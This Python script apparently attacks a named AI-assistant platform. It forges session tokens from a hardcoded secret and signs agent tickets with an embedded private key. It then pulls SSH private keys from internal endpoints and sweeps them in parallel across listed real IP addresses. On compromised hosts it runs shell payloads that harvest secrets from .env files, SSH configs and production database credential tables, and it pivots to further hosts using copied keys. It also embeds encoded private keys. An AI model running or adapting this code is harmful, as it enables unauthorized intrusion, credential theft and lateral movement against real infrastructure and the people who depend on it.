# -*- coding: utf-8 -*-
# intent 29438 round C: fix key embed; correct host_key_fp (known_hosts line parts[2]); ssh-sign offer+sign;
# login prod center with real keys -> authorized_keys/sshd/DB authoritative answer;
# sweep ALL project SSH keys over their full registered host tables (parallel) -> shell
import json,os,sys,base64,re,subprocess,time,struct,hashlib
from concurrent.futures import ThreadPoolExecutor
HOST="assistant.lumiiai.cn"; BASE="https://"+HOST
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
AJWT="ce9a4dedd895086314a624d5039fc9ecdf06713424348cf72fa7815817d3a938"
ORG="org_bTLzxtBLmugV8uxx4QTyw"; USER="usr_ZxLewKrgbRYSm7rWDtQX8"
PROJ="proj_UWYqoFajbyb8wZchMjPZm"
DER_B64="MC4CAQAwBQYDK2VwBCIEIDBpyNy4vf5x/6pHS60sCrMBk/pcTOjxbKFwMtaXL3UG"
KNOWN_CONV="conv_PtLo6eX4k8LRCFB72DPMo"; KNOWN_ASST="asst_E3G6xx8h7Ei279q6ossJ6"
WORK="/tmp/p29438c"; os.makedirs(WORK,exist_ok=True)
def R(k,v,maxb=30000):
    try: s=json.dumps(v,ensure_ascii=False)
    except Exception: s=repr(v)
    if len(s)>maxb: s=s[:maxb]+"...TRUNC"
    sys.stdout.write("R:%s:%s\n"%(k,base64.b64encode(s.encode()).decode())); sys.stdout.flush()
def curl(args,timeout=45,stdin=None):
    try:
        p=subprocess.run(["curl","--http2","-sS"]+args,input=stdin,capture_output=True,timeout=timeout+25)
        return p.returncode,p.stdout,p.stderr
    except Exception as e: return -1,b"",repr(e).encode()
def call(path,method="GET",body=None,hdrs=None,timeout=45,maxlen=12000,cookie=None):
    args=["-m",str(timeout),"-A",UA,"-w","\n__CODE__%{http_code}"]
    if cookie: args+=["-H","Cookie: "+cookie]
    h={"Accept":"application/json","Referer":BASE+"/","Origin":BASE}
    if hdrs: h.update(hdrs)
    for k,v in h.items(): args+=["-H","%s: %s"%(k,v)]
    data=None
    if body is not None:
        data=json.dumps(body).encode(); args+=["-H","Content-Type: application/json","--data-binary","@-"]
    if method!="GET": args+=["-X",method]
    args+=[BASE+path]
    rc,out,err=curl(args,timeout=timeout,stdin=data)
    txt=out.decode("utf-8","replace"); code=""; i=txt.rfind("__CODE__")
    if i>=0: code=txt[i+8:].strip()[:3]; txt=txt[:i]
    return {"code":code,"body":txt[:maxlen],"len":len(txt)}
def J(r):
    try: return json.loads(r["body"])
    except Exception: return None
def _b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
def forge_a(secret,sub,org):
    import hmac
    now=int(time.time())
    h=_b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=_b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_%d"%now,"lgn":now},separators=(",",":")))
    sig=_b64u(hmac.new(secret.encode(),(h+"."+p).encode(),hashlib.sha256).digest())
    return "lumii_session="+h+"."+p+"."+sig
der=base64.b64decode(DER_B64); open(WORK+"/k.der","wb").write(der)
open(WORK+"/sign.js","w").write('''const fs=require('fs'),crypto=require('crypto');const der=fs.readFileSync(process.argv[2]);const msg=fs.readFileSync(process.argv[3]);const k=crypto.createPrivateKey({key:der,format:'der',type:'pkcs8'});process.stdout.write(crypto.sign(null,msg,k).toString('base64url'));''')
def ed_sign(payload):
    open(WORK+"/msg.txt","wb").write(payload.encode())
    try:
        p=subprocess.run(["node",WORK+"/sign.js",WORK+"/k.der",WORK+"/msg.txt"],capture_output=True,timeout=25)
        return p.stdout.decode().strip()
    except Exception: return ""
def mint_ticket(agent_id, chat, ttl=7200):
    now=int(time.time())
    claims={"kid":"46b1701a","iss":"center","aud":agent_id,"org":ORG,"iat":now,"exp":now+ttl,
            "session_key":"dashboard:"+chat.get("conversation_id",""),"turn_id":"","platform":"dashboard",
            "chat_id":chat.get("conversation_id",""),"actor_id":USER,"on_behalf_of":USER,
            "assistant_id":chat.get("assistant_id",""),"team_id":None,"chain":[],"chat":chat}
    payload=_b64u(json.dumps(claims,separators=(",",":"),ensure_ascii=False))
    return "v2."+payload+"."+ed_sign(payload)
def run(cmd,timeout=60,stdin=None):
    try:
        p=subprocess.run(cmd,input=stdin,capture_output=True,timeout=timeout)
        return p.returncode,p.stdout.decode("utf-8","replace"),p.stderr.decode("utf-8","replace")
    except Exception as e: return -1,"",repr(e)
def fp_kh(line):
    try:
        parts=line.strip().split()
        raw=base64.b64decode(parts[2] if len(parts)>=3 else parts[1])
        return "SHA256:"+base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    except Exception: return ""
def fp_pub(line):
    try:
        raw=base64.b64decode(line.strip().split()[1])
        return "SHA256:"+base64.b64encode(hashlib.sha256(raw).digest()).decode().rstrip("=")
    except Exception: return ""
def wire_str(b):
    if isinstance(b,str): b=b.encode()
    return struct.pack(">I",len(b))+b

C=forge_a(AJWT,USER,ORG)
R("me",{"code":call("/api/me",cookie=C)["code"]})
RTID=RID=RTOK=""
rt=call("/api/runtimes","POST",{"name":"pr29438c","visibility":"org"},cookie=C,maxlen=400000)
RJ=J(rt) or {}; RTID=RJ.get("id") or ""; RID=RJ.get("agentId") or ""; script=RJ.get("script","") or ""
mm=re.search(r"AGENT_TOKEN='([^']+)'",script) or re.search(r"AGENT_TOKEN=\"?([A-Za-z0-9_\-]{20,})",script)
RTOK=mm.group(1) if mm else ""
R("rt",{"code":rt["code"],"rtid":RTID,"toklen":len(RTOK)})
MH=None
if RID and RTOK:
    cj=J(call("/api/conversations/"+KNOWN_CONV,cookie=C,maxlen=4000)) or {}
    co=cj.get("conversation") if isinstance(cj.get("conversation"),dict) else cj
    lane={"conv":co.get("id") or KNOWN_CONV,"asst":co.get("assistantId") or KNOWN_ASST,"pid":co.get("projectId") or PROJ}
    chat={"project_id":lane["pid"],"conversation_id":lane["conv"],"assistant_id":lane["asst"],"repo_ids":[]}
    tk=mint_ticket(RID,chat)
    MH={"Authorization":"Bearer "+RTOK,"x-agent-id":RID,"x-lumii-turn-proof":tk}
    R("sshkeys",{"code":call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH)["code"]})

# ---------- env host fp + ssh-sign ----------
if MH:
    opz=J(call("/api/projects/%s/ops"%PROJ,cookie=C,maxlen=600000)) or {}
    ENV=[]
    for e in (opz.get("environments") or []):
        s=e.get("sshKey") or {}
        ENV.append({"eid":e.get("id"),"key":e.get("key"),"tier":e.get("tier"),"access":e.get("accessMode") or e.get("access_mode"),
                    "host":s.get("host"),"port":s.get("port"),"user":s.get("loginUser"),"hostKey":s.get("hostKey") or "","fp":s.get("fingerprint") or ""})
    for e in ENV:
        if not e["eid"] or (e["access"] or "")!="ssh_key": continue
        cr=call("/internal/build/credential","POST",{"environment_id":e["eid"],"purpose":"ssh_agent"},hdrs=MH,maxlen=30000)
        cj=J(cr) or {}
        if cj.get("private_key"):
            fn="ek_%s"%re.sub(r'[^a-zA-Z0-9]','_',e["key"]); open(WORK+"/"+fn,"w").write(cj["private_key"]); os.chmod(WORK+"/"+fn,0o600); e["keyfile"]=fn
        R("cred_%s"%e["key"],{"code":cr["code"],"has":bool(cj.get("private_key"))})
    for e in ENV:
        if not e.get("keyfile"): continue
        fph=fp_kh(e["hostKey"]); fpk=e["fp"] or fp_pub(e.get("pubKey") or "")
        base={"environment_id":e["eid"],"host_key_fp":fph,"login_user":e["user"],"key_fp":fpk,"host":e["host"],"port":e["port"]}
        o1=call("/internal/build/ssh-sign","POST",dict(base,phase="offer"),hdrs=MH,maxlen=4000)
        R("ss_offer_%s"%e["key"],{"code":o1["code"],"body":o1["body"][:500],"fph":fph,"fpk":fpk})
        rc,o,er=run(["ssh-keygen","-y","-f",WORK+"/"+e["keyfile"]],timeout=20); fullpub=o.strip()
        if fullpub:
            blob=base64.b64decode(fullpub.split()[1]); sid=os.urandom(32)
            pkt=bytes([50])+wire_str(e["user"])+wire_str("ssh-connection")+wire_str("publickey")+bytes([1])+wire_str(fullpub.split()[0])+wire_str(blob)
            s1=call("/internal/build/ssh-sign","POST",dict(base,phase="sign",sign_data=base64.b64encode(sid+pkt).decode(),sign_flags=0),hdrs=MH,maxlen=4000,timeout=60)
            sj=J(s1) or {}
            R("ss_sign_%s"%e["key"],{"code":s1["code"],"decision":sj.get("decision"),"code2":sj.get("code"),"msg":(sj.get("message") or "")[:80],"siglen":len(sj.get("signature") or ""),"sig_head":(sj.get("signature") or "")[:20]})
            # sign_data with a wrong key fp
            s2=call("/internal/build/ssh-sign","POST",dict(base,phase="sign",key_fp="SHA256:AAAAwrongwrongwrongwrongwrongwrongwrongwron",sign_data=base64.b64encode(sid+pkt).decode()),hdrs=MH,maxlen=2000)
            R("ss_sign_badkey_%s"%e["key"],{"code":s2["code"],"body":s2["body"][:240]})
        time.sleep(0.2)

# ---------- project ssh keys: full host sweep ----------
KEYFILES=[]
if MH:
    sk=J(call("/internal/build/ssh-keys",method="POST",body={},hdrs=MH,maxlen=60000)) or {}
    keys=sk.get("ssh_keys") or []
    R("keys_meta",[{"id":k.get("key_id"),"name":k.get("name"),"mode":k.get("mode"),"nhosts":len(k.get("hosts") or []),"patterns":k.get("patterns"),"via":k.get("pattern_via")} for k in keys])
    for k in keys:
        cr=call("/internal/build/credential","POST",{"ssh_key_id":k.get("key_id"),"purpose":"ssh_agent"},hdrs=MH,maxlen=40000)
        cj=J(cr) or {}
        pks=cj.get("private_keys") or []
        for i,pk in enumerate(pks):
            fn="pk_%s_%d"%(re.sub(r'[^a-zA-Z0-9]','_',k.get("key_id") or "x"),i)
            open(WORK+"/"+fn,"w").write(pk); os.chmod(WORK+"/"+fn,0o600)
        R("keycred_%s"%k.get("key_id"),{"code":cr["code"],"n":len(pks),"hosts":[ (h.get("host"),h.get("port"),h.get("login_user") or h.get("loginUser")) for h in (k.get("hosts") or [])]})
        for h in (k.get("hosts") or []):
            for i in range(len(pks)):
                KEYFILES.append({"key":k.get("key_id"),"name":k.get("name"),"fn":"pk_%s_%d"%(re.sub(r'[^a-zA-Z0-9]','_',k.get("key_id") or "x"),i),
                                 "host":h.get("host"),"port":h.get("port") or 22,"user":h.get("login_user") or h.get("loginUser") or "ubuntu"})
# priority: our assets first
PRI=["81.68.254.22","43.142.238.91","122.51.1.87","124.223.170.146","1.14.34.31","129.211.0.26","43.143.107.214","13.215.141.192","101.32.60.77"]
KEYFILES.sort(key=lambda t: PRI.index(t["host"]) if t["host"] in PRI else 99)
KEYFILES=KEYFILES[:110]
def attempt(t):
    path=WORK+"/"+t["fn"]
    if not os.path.exists(path): return dict(t,rc=-99,last="nokey")
    a=["ssh","-i",path,"-p",str(t["port"]),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
       "-o","ConnectTimeout=6","-o","IdentitiesOnly=yes","-o","PreferredAuthentications=publickey","-o","PasswordAuthentication=no",
       "%s@%s"%(t["user"],t["host"]),"id;hostname"]
    rc,o,e=run(a,timeout=30)
    last=(o.strip().replace("\n","|") or e.strip().splitlines()[-1] if e.strip() else "")
    return dict(t,rc=rc,last=last[:160],out=o[:300])
RES=[]
try:
    with ThreadPoolExecutor(max_workers=14) as ex:
        for r in ex.map(attempt,KEYFILES): RES.append(r)
except Exception as ex: R("sweep_err",repr(ex))
R("sweep",[{"h":"%s:%s"%(r["host"],r["port"]),"u":r["user"],"k":r["name"] or r["key"],"rc":r["rc"],"last":r.get("last")} for r in RES])
WINS=[r for r in RES if r.get("rc")==0 and "uid=" in (r.get("out") or "")]

# ---------- harvest wins ----------
HARVEST=r'''
id; hostname; sudo -n id 2>&1 | head -2
echo "### env"
for f in /opt/lumii-prod/.env.dev /opt/lumii-stage/.env.dev /opt/src/.env.dev /opt/lumii-dev/.env.dev; do [ -r "$f" ] && { echo "--$f"; set -a; . "$f" 2>/dev/null; set +a; env | grep -iE 'ZOOFI|JWT_SECRET|DATABASE_URL|POSTGRES|MYSQL|REDIS|_DSN|GITHUB|GH_TOKEN|REGISTRY|WALLET|PRIVATE|AWS|TENCENT|ALIYUN|LTAI|AKID|CF_|TUNNEL' | sed 's/=.*/=<set>/' | head -40; }; done
echo "### files"
ls -la ~/.ssh /opt /etc/ci /etc/docker /home/*/.docker/config.json 2>/dev/null | head -40
cat ~/.ssh/config ~/.ssh/known_hosts 2>/dev/null | head -20
echo "### git"
ls -d /opt/src/* /home/*/lumii-* 2>/dev/null | head -10
echo END'''
for i,r in enumerate(WINS[:6]):
    call_harvest=ssh_harv=run(["ssh","-i",WORK+"/"+r["fn"],"-p",str(r["port"]),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null","-o","ConnectTimeout=8","-o","IdentitiesOnly=yes","%s@%s"%(r["user"],r["host"]),HARVEST],timeout=90)
    rc,o,e=call_harvest
    R("win_%d"%i,{"host":r["host"],"port":r["port"],"user":r["user"],"key":r["name"],"rc":rc,"out":o[:6000],"err":e[-200:]})

# ---------- prod center login + authoritative diagnostics ----------
open(WORK+"/k29233b","wb").write(base64.b64decode(b"""LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNBUnA1S0NGVkJqbmQrV3ZScGVNZkJhclhucksrRFNUWnU3bDFiWnhnTnp0d0FBQUpBZkhXeFZIeDFzClZRQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQVJwNUtDRlZCam5kK1d2UnBlTWZCYXJYbnJLK0RTVFp1N2wxYlp4Z056dHcKQUFBRUN4TzluZHltcklQVmxlUDF0dlZ3cWNmL0FDczJrSVk0NlRWNVdKenh0dDFCR25rb0lWVUdPZDM1YTlHbDR4OEZxdAplZXNyNE5KTm03dVhWdG5HQTNPM0FBQUFCMmt5T1RJek0ySUJBZ01FQlFZPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K""")); os.chmod(WORK+"/k29233b",0o600)
open(WORK+"/key_fleet.pem","wb").write(base64.b64decode(b"""LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNEK2lGM2FUd2ZGMzFoWkVRbGk0Wkk1cmt6VWNLVXdubkcyTnAzZi9RYlI5d0FBQUpEMmk4S0k5b3ZDCmlBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDRCtpRjNhVHdmRjMxaFpFUWxpNFpJNXJrelVjS1V3bm5HMk5wM2YvUWJSOXcKQUFBRUN2TFZDN1NZUDBoTVpSOENWaEE3MS9aQktBV3orNG9UMU0wL2ErT1JuVjdmNklYZHBQQjhYZldGa1JDV0xoa2ptdQpUTlJ3cFRDZWNiWTJuZC85QnRIM0FBQUFER052WkdWeVFHeDFiV2xwTmdFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K""")); os.chmod(WORK+"/key_fleet.pem",0o600)
ENVPUB=[]
for f in os.listdir(WORK):
    if f.startswith("ek_"):
        rc,o,er=run(["ssh-keygen","-y","-f",WORK+"/"+f],timeout=20)
        if o.strip(): ENVPUB.append(o.strip().split()[1])
PUBS=" ".join(sorted(set(ENVPUB)))
DIAG=r'''
echo "### id"; id; hostname
echo "### sshd"
sudo sh -c 'grep -v "^#" /etc/ssh/sshd_config | grep -v "^$"; echo ---; ls /etc/ssh/sshd_config.d/ 2>/dev/null; grep -r "" /etc/ssh/sshd_config.d/ 2>/dev/null | head -30'
echo "### authkeys"
for f in /home/ubuntu/.ssh/authorized_keys /home/ubuntu/.ssh/authorized_keys2 /root/.ssh/authorized_keys /root/.ssh/authorized_keys2; do echo "--$f"; sudo sh -c "wc -l $f 2>/dev/null; grep -oE 'from=\"?[^ ,\"]*|command=\"?[^ ,\"]*|ssh-[a-z0-9-]+ (AAAA|AAAAB)' $f 2>/dev/null | sort | uniq -c | head -20"; done
echo "### envpub_match"
for v in __PUBS__; do echo -n "${v:0:20}: "; sudo grep -l "$v" /home/ubuntu/.ssh/authorized_keys* /root/.ssh/authorized_keys* 2>/dev/null | tr '\n' ','; echo; done
echo "### keys"; sudo ls -la /root/.ssh /home/ubuntu/.ssh 2>/dev/null | head -30
echo "### net"; ip -4 addr 2>/dev/null | grep "inet " | head; ip route 2>/dev/null | head -5
echo "### db"
sudo -u postgres psql -d lumii_center -tAc "select kind, count(*) from credentials group by kind" 2>&1 | head -10
sudo -u postgres psql -d lumii_center -tAc "select k.id,k.name,k.host,k.port,k.login_user,k.status from ssh_key_hosts k limit 40" 2>&1 | head -45
echo "### projects"
sudo -u postgres psql -d lumii_center -tAc "select id,name from projects limit 20" 2>&1 | head -22
echo END'''
def ssh_run(host,port,user,kf,remote_cmd,tmo=150):
    path=os.path.join(WORK,kf)
    if not os.path.exists(path): return {"rc":-99,"err":"nokey"}
    a=["ssh","-i",path,"-p",str(port),"-o","BatchMode=yes","-o","StrictHostKeyChecking=no","-o","UserKnownHostsFile=/dev/null",
       "-o","ConnectTimeout=10","-o","IdentitiesOnly=yes","%s@%s"%(user,host),remote_cmd]
    rc,o,e=run(a,timeout=tmo); return {"rc":rc,"out":o[:9000],"err":e[-260:]}
COK=None
for name in ["k29233b","key_fleet.pem"]:
    for u in ["ubuntu","root"]:
        rr=ssh_run("122.51.1.87",22,u,name,DIAG.replace("__PUBS__",PUBS),tmo=170)
        ok=(rr.get("out") or "").find("### id")>=0
        R("center_%s_%s"%(name,u),{"rc":rr.get("rc"),"ok":ok,"out":rr.get("out","")[:9000],"err":rr.get("err","")[:200]})
        if ok: COK=(name,u); break
    if COK: break

# ---------- from center: pivot to env hosts ----------
if COK:
    name,u=COK
    blobs=[]
    for f in sorted(os.listdir(WORK)):
        if f.startswith("ek_"):
            blobs.append("printf %s %s | base64 -d > /tmp/p2/%s"%(base64.b64encode(open(WORK+"/"+f,"rb").read()).decode(), f))
    setup="mkdir -p /tmp/p2 && chmod 700 /tmp/p2 && "+" && ".join(blobs)+" && chmod 600 /tmp/p2/ek_* && echo SETUP_OK"
    s1=ssh_run("122.51.1.87",22,u,name,setup,tmo=90); R("center_setup",{"rc":s1.get("rc"),"out":(s1.get("out") or "")[-200:]})
    PIVOT=r'''
echo "### reach"
for h in 81.68.254.22 43.142.238.91 124.223.170.146 1.14.34.31 129.211.0.26; do timeout 4 bash -c "echo > /dev/tcp/$h/22" 2>/dev/null && echo "TCP $h:22 OPEN" || echo "TCP $h:22 BLOCKED"; done
echo "### centerkeys"; for k in /home/ubuntu/.ssh/id_* /root/.ssh/id_*; do [ -f "$k" ] && echo "KEY $k"; done
echo "### try_centerkeys"
for h in 81.68.254.22 43.142.238.91 124.223.170.146 1.14.34.31 129.211.0.26; do
 for uu in ubuntu root; do
  for k in /home/ubuntu/.ssh/id_ed25519 /home/ubuntu/.ssh/id_rsa /root/.ssh/id_ed25519 /root/.ssh/id_rsa /home/ubuntu/.ssh/lumii*; do
   [ -f "$k" ] || continue
   r=$(timeout 9 ssh -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes $uu@$h 'id;hostname' 2>&1 | tail -1)
   case "$r" in *"Permission denied"*|*"timed out"*|*"onnection"*|*"rror"*) ;; *) echo "WIN $uu@$h key=$k => $r";; esac
  done
 done
done
echo "### try_envkeys"
for k in /tmp/p2/ek_*; do
 [ -f "$k" ] || continue; chmod 600 $k
 for h in 81.68.254.22 43.142.238.91 124.223.170.146 1.14.34.31 129.211.0.26; do
  for uu in ubuntu root; do
   r=$(timeout 9 ssh -i $k -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=6 -o IdentitiesOnly=yes $uu@$h 'id;hostname' 2>&1 | tail -1)
   case "$r" in *"Permission denied"*|*"timed out"*|*"onnection"*|*"rror"*) ;; *) echo "WIN $uu@$h key=$k => $r";; esac
  done
 done
done
echo END'''
    p1=ssh_run("122.51.1.87",22,u,name,PIVOT,tmo=420); R("center_pivot",p1)

if RTID:
    R("cleanup",{"code":call("/api/runtimes/"+RTID,method="DELETE",cookie=C,maxlen=500)["code"]})
R("done",{"t":int(time.time())})
